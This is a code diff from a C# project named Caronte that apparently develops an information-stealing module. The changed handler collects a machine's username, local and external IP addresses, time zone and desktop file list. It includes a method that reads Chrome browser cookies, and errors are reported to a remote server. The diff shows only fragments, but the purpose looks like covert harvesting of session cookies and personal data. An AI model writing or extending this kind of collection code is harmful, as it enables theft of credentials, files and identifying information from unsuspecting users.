@@ -15,17 +15,22 @@ using System.Threading.Tasks;
 
 namespace Caronte.Modules.Information.GetClientInformation
 {
-    public class GetClientInformationQueryHandler : SendErrorToServer, IRequestHandler<GetClientInformationQuery, CommomMediatorResponses<ClientInformation>>
+    public class GetClientInformationQueryHandler : SendErrorToServer, IRequestHandler<GetClientInformationQuery, CommomMediatorResponse<ClientInformation>>
     {
-        public GetClientInformationQueryHandler(IHttpClientFactory httpClientFactory, IWebServiceURLFactory webServiceURLFactory)
-            : base(httpClientFactory, webServiceURLFactory)
+        public GetClientInformationQueryHandler(IHttpClientFactory httpClientFactory, IWebServiceURLFactory webServiceURLFactory) : base(httpClientFactory, webServiceURLFactory)
         {
-
         }
 
-        public async Task<CommomMediatorResponses<ClientInformation>> Handle(GetClientInformationQuery request, CancellationToken cancellationToken)
+        public async Task<CommomMediatorResponse<ClientInformation>> Handle(GetClientInformationQuery request, CancellationToken cancellationToken)
         {
-            var clientInformation = new ClientInformation();
+            return new CommomMediatorResponse<ClientInformation>(new ClientInformation()
+            {
+                CurrentTimeZoneInfo = GetCurrentTimeZoneInfo(),
+                DesktopFiles = await GetClientDesktopFiles(),
+                ExternalIp = await GetExternalIp(),
+                LocalIp = await GetLocalIp(),
+                Username = await GetUsername()
+            });
         }
 
         private async Task<string> GetUsername()
@@ -99,7 +104,7 @@ namespace Caronte.Modules.Information.GetClientInformation
             return desktopFiles;
         }
 
-        private byte[] GetChromeNavigatorCookie()
+        private async Task<byte[]> GetChromeNavigatorCookie()
         {
             try
             {
@@ -107,7 +112,7 @@ namespace Caronte.Modules.Information.GetClientInformation
             }
             catch (Exception ex)
             {
-
+                await SendError(ex);
             }
 
             return new byte[0];
